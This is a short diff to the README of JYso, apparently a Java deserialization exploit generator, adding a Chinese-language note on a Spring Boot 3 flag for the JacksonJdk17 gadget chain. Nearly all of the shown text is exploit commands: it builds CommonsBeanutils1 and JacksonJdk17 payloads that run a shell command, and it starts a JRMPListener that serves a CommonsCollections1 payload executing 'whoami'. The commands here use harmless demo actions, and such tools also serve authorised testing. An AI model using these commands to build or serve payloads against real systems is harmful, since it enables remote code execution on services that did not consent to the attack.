@@ -1016,3 +1016,10 @@ java -jar JYso-[version].jar -yso 1 -g CommonsBeanutils1 -p 'EX-MS-TEXMSFromThre
 ```
 java -cp JYso-[version].jar -yso 1 com.qi4l.jndi.exploit.JRMPListener 8888 -g CommonsCollections1 -p whoami
 ```
+
+## 3.0 Springboot版本
+
+在jacksonjdk17链中，增加springboot版本参数,-springboot3 true则使用3版本默认为2
+```
+java -jar JYso-3.5.7.jar -yso 1  -g JacksonJdk17 -p "open -a Calculator" -f dns.ser -springboot3 true
+```
